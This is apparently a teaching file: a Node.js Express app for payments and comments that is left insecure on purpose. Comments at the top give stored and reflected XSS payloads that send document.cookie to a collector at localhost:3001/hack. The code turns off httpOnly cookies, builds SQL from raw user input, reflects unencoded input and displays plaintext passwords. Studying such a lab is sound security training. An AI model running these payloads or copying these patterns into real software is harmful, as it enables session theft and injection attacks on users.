const express = require("express");
const port = parseInt(process.env.PORT, 10) || 3000;
const htmlencode = require("htmlencode");

/* Example of stored xss
<script>var url = `http://localhost:3001/hack?victimCookie=${document.cookie}`;document.write(`<img src="${url}"/>`);</script>

solution: ${htmlencode.htmlEncode(comment)}
*/

/* Examples of reflected xss
http://localhost:3000/search_payments?date=%3Cscript%3Evar+url+%3D+%60http%3A%2F%2Flocalhost%3A3001%2Fhack%3FvictimCookie%3D%24%7Bdocument.cookie%7D%60%3Bdocument.write%28%60%3Cimg+src%3D%22%24%7Burl%7D%22%2F%3E%60%29%3B%3C%2Fscript%3E

With Same Origin Policy Block:
<script>var url = `http://localhost:3001/hack?victimCookie=${document.cookie}`;fetch(url);</script>

solution: htmlencode.htmlEncode(date)
*/

const { Client } = require("pg");

const DB_CONNECTION = {
  user: "ddss",
  database: "ddss",
  password: "ddss",
  host: process.env.DB_HOST || "localhost",
  port: 5432,
};

const session = require("express-session");
const app = express();

app.use(
  session({
    /* FIXME creating a vulnerability on purpose. Now I am able to acess cookies in the browser */
    cookie: { httpOnly: false },
    secret: "ddss",
    resave: false,
    saveUninitialized: true,
  })
);

app.use(express.urlencoded());

const fetchAndRenderCommentsList = async () => {
  const client = new Client(DB_CONNECTION);

  try {
    client.connect();

    const selectQuery = `select * from comment`;
    const commentRecords = await client.query(selectQuery);

    let commentItemsHtml = "";
    commentRecords.rows.forEach(({ user_email, user_name, comment }) => {
      commentItemsHtml += `<li style="border:1px solid; margin-bottom:5px; padding: 5px;">
                <p><strong>Email:</strong> ${user_email}</p>
                <p><strong>Name:</strong> ${user_name}</p>
                <div>
                    <p><strong>Comment:</strong></p>
                    <p>${htmlencode.htmlEncode(comment)}</p>
                </div>
            </li>`;
    });

    return `<ul style="list-style-type:none; padding: 0;">${commentItemsHtml}</ul>`;
  } catch (error) {
    console.log("Error: ", error);
    return `<p>Error</p>`;
  } finally {
    client.end();
  }
};

app.get("/", (req, res) => {
  console.log("Session ID: ", req.sessionID);

  return res.send(`<html>
        <main>
            <form method="POST" action="/sessions">
                <input name="email" type="email"/>
                <input name="password" type="password"/>
                <button type="submit">Login</button>
            </form>
            <a href="/signup">Create Account</a>
        </main>
    </html>`);
});

app.get("/comments", async (req, res) => {
  return res.send(`<html>
        <main>
            <header>
                <aside id="sidebar">
                    <a href="/payments">Payments</a>
                    <a href="/me">Account info</a>
                </aside>
            </header>
            <article>
                <form method="POST" action="/comments">
                    <h1>Make your review</h1>
                    <fieldset>
                        <p>
                            <label>
                                Email
                                <input name="email" type="email" placeholer="Write your email"/>
                            </label>
                        <p>                        
                        <p>
                            <label>
                                Name
                                <input name="name" type="text" placeholer="Write your name"/>
                            </label>
                        </p>
                        <p>
                            <label>
                                <p>Your Comment</p>
                                <textarea name="comment" rows="4" cols="50" placeholder="Leave your review"></textarea>
                            </label>
                        </p>
                        <button type="submit">Send</button>
                    </fieldset>                    
                </form>
                <section>
                    <h2>Comments</h2>
                    ${await fetchAndRenderCommentsList()}
                </section>
            </article>
        </main>
    </html>`);
});

app.post("/comments", (req, res) => {
  const client = new Client(DB_CONNECTION);
  const { name, email, comment } = req.body;

  client.connect();

  const insertQuery = `insert into comment (user_email, user_name, comment) values('${email}', '${name}', '${comment}')`;
  console.log("Insert User: ", insertQuery);
  client.query(insertQuery, (dbErr, dbRes) => {
    if (dbErr) {
      // TODO
      console.log("Error: ", dbErr);
      res.redirect("/");
    } else {
      res.redirect("/comments");
    }

    client.end();
  });
});

app.get("/transaction/new", async (req, res) => {
  return res.send(`<html>
        <main>
            <header>
                <aside id="sidebar">
                    <a href="/payments">Payments</a>
                    <a href="/me">Account info</a>
                </aside>
            </header>
            <article>
                <form method="POST" action="/transactions">
                    <h1>Send funds</h1>
                    <fieldset>
                        <p>
                            <label>
                                Email destination
                                <input name="email" type="email" placeholer="Email to receive money"/>
                            </label>
                        <p>                        
                        <p>
                            <label>
                                Amount
                                <input name="amount" type="number" placeholer="Write the amount"/>
                            </label>
                        </p>
                        <button type="submit">Send</button>
                    </fieldset>                    
                </form>
            </article>
        </main>
    </html>`);
});

app.post("/transactions", async (req, res) => {
  const client = new Client(DB_CONNECTION);
  const { email, amount } = req.body;

  try {
    client.connect();

    const currentSessionQuery = `select * from user_session where session_id = '${req.sessionID}'`;

    const sessionRows = await client.query(currentSessionQuery);

    // Check authentication
    const isAuthValid = !!(sessionRows && sessionRows.rowCount === 1);

    if (!isAuthValid) {
      res.redirect("/");
      return;
    }

    const authUserEmail = sessionRows.rows[0]["user_email"];

    const insertQuery = `insert into transactions (from_email, to_email, amount) values('${authUserEmail}', '${email}', '${amount}')`;
    console.log("Insert Transaction: ", insertQuery);
    await client.query(insertQuery, (dbErr, dbRes) => {
      if (dbErr) {
        console.log("Error: ", dbErr);
        res.redirect("/");
      } else {
        res.redirect("/transaction/new");
      }

      client.end();
    });
  } catch (error) {
    client.end();
    res.redirect("/");
  }
});

app.get("/signup", (req, res) => {
  console.log("Session ID: ", req.sessionID);

  return res.send(`<html>
        <main>
            <form method="POST" action="/users">
                <input name="name" type="text"/>
                <input name="email" type="email"/>
                <input name="password" type="password"/>
                <button type="submit">Sign Up</button>
            </form>
            <a href="/">Login</a>
        </main>
    </html>`);
});

app.get("/me", async (req, res) => {
  console.log("Session ID: ", req.sessionID);
  const client = new Client(DB_CONNECTION);

  try {
    client.connect();

    const currentSessionQuery = `select * from user_session where session_id = '${req.sessionID}'`;

    const sessionRows = await client.query(currentSessionQuery);

    // Check authentication
    const isAuthValid = !!(sessionRows && sessionRows.rowCount === 1);

    if (!isAuthValid) {
      res.redirect("/");
      return;
    }

    const authUserEmail = sessionRows.rows[0]["user_email"];

    res.send(`<html>
            <main>
                <aside id="sidebar">
                    <a href="/payments">Payments</a>
                    <a href="/users/${authUserEmail}">Account info</a>
                    <a href="/transaction/new">Send money</a>                    
                </aside>
                <p>Welcome Home</p>
                <form method="POST" action="/logout">
                    <button type="submit">Logout</button>
                </form>
            </main>
        </html>`);
  } catch (error) {
    res.redirect("/");
  } finally {
    client.end();
  }
});

app.post("/sessions", async (req, res) => {
  console.log("Session ID: ", req.sessionID);

  const client = new Client(DB_CONNECTION);
  const { email, password } = req.body;

  try {
    client.connect();

    // TODO create transaction

    // TODO protection to destroy previous session. Leave it open as a vulnerability

    const destroySessionQuery = `DELETE from user_session where user_email='${email}'`;
    await client.query(destroySessionQuery);

    // console.log('Destroy session query: ', destroySessionQuery);
    const selectQuery = {
      text: "select * from ddss_user where email=$1 AND password = $2",
      values: [email, password],
    };

    // const selectQuery = `select * from ddss_user where email='${email}' AND password = '${password}'`;
    console.log("Login query: ", selectQuery);
    const dbRes = await client.query(selectQuery);
    const isAuthValid = !!(dbRes && dbRes.rowCount > 0);

    if (isAuthValid) {
      const destroySessionQuery = `DELETE from user_session where session_id='${req.sessionID}'`;
      await client.query(destroySessionQuery);

      const createSessionQuery = `insert into user_session values('${req.sessionID}', '${email}')`;
      await client.query(createSessionQuery);

      res.redirect("/me");
    } else {
      // TODO invalidate session
      req.session.destroy();
      res.redirect("/");
    }
  } catch {
    res.redirect("/");
  } finally {
    client.end();
  }
});

app.post("/users", (req, res) => {
  console.log("Session ID: ", req.sessionID);

  const client = new Client(DB_CONNECTION);
  const { name, email, password } = req.body;

  client.connect();

  const insertQuery = `insert into ddss_user values('${email}', '${password}', '${name}')`;
  console.log("Insert User: ", insertQuery);
  client.query(insertQuery, (dbErr, dbRes) => {
    if (dbErr) {
      // TODO
      console.log("Error: ", dbErr);
      res.redirect("/signup");
    } else {
      res.redirect("/");
    }

    client.end();
  });
});

app.get("/users/:email", async (req, res) => {
  console.log("Users: ", req.sessionID);
  const client = new Client(DB_CONNECTION);
  const { email } = req.params;
  console.log("Email: ", email);
  try {
    client.connect();

    const currentSessionQuery = `select * from user_session where session_id = '${req.sessionID}'`;

    const sessionRows = await client.query(currentSessionQuery);
    console.log("Sessions rows: ", sessionRows);

    // Check authentication
    const isAuthValid = !!(sessionRows && sessionRows.rowCount === 1);

    if (!isAuthValid) {
      res.redirect("/");
      return;
    }

    // Should check authorization: email === authUserEmail (isAuthUser)
    const authUserEmail = sessionRows.rows[0]["user_email"];
    const isAuthUser = email === authUserEmail;
    if (!isAuthUser) {
      const htmlResponse = `<html>
                    <main>
                        <p>Not authorized</p>
                    </main>
                </html>`;

      res.send(htmlResponse);
      return;
    }

    const selectQuery = `select * from ddss_user where email = '${email}'`;
    const user = await client.query(selectQuery);

    if (user && user.rowCount === 1) {
      // show user info
      const htmlResponse = `<html>
                    <main>
                        <h3>Your password is</h3>
                        <p>${user.rows[0].password}</p>
                    </main>
                </html>`;

      res.send(htmlResponse);
    } else {
      console.log("No user");
      res.redirect("/");
    }
  } catch (error) {
    console.log("error: ", error);
    res.redirect("/");
  } finally {
    client.end();
  }
});

app.get("/payments", (req, res) => {
  console.log("Session ID: ", req.sessionID);

  return res.send(`<html>
        <main>
            <form method="GET" action="/search_payments">
                <input name="date" type="text" style="width: 80%"/>
                <button type="submit">Search</button>
            </form>
            <a href="/me">Home</a>
        </main>
    </html>`);
});

app.get("/search_payments", async (req, res) => {
  console.log("Session ID: ", req.sessionID);

  const client = new Client(DB_CONNECTION);
  const { date } = req.query;

  try {
    client.connect();

    const currentSessionQuery = `select * from user_session where session_id = '${req.sessionID}'`;

    const sessionRows = await client.query(currentSessionQuery);

    const authUserEmail = sessionRows.rows[0]["user_email"];

    const selectQuery = `select * from payment where user_email = '${authUserEmail}' AND validity = '${date}'`;
    console.log("Search payments: ", selectQuery);
    const paymentRecords = await client.query(selectQuery);

    let tableRowsHtml = "";
    paymentRecords.rows.forEach(({ card_number, validity, security_code }) => {
      tableRowsHtml += `<tr>
                <td>${card_number}</td>
                <td>${validity}</td>
                <td>${security_code}</td>
            </tr>`;
    });

    const htmlResponse = `<html>
            <main>
                <h3>Your Payments at ${date}</h3>
                <table>
                    <thead>
                        <tr>
                            <th>Credit Card</th>
                            <th>Validity</th>
                            <th>Security Code</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${tableRowsHtml}
                    </tbody>
                </table>
            </main>
        </html>`;

    // TODO to remove, letting an open vulnerability for reflected XSS
    // res.set('X-XSS-Protection', 0);

    res.send(htmlResponse);
  } catch (error) {
    res.redirect("/");
  } finally {
    client.end();
  }
});

app.post("/logout", (req, res) => {
  console.log("Session ID: ", req.sessionID);
  const client = new Client(DB_CONNECTION);

  req.session.destroy();

  client.connect();

  const destroySessionQuery = `DELETE from user_session where session_id='${req.sessionID}'`;

  client.query(destroySessionQuery, (dbErr, dbRes) => {
    if (dbErr) {
      // TODO handle error
    }

    res.redirect("/");

    client.end();
  });
});

app.listen(port, () => console.log(`Example app listening on port ${port}!`));
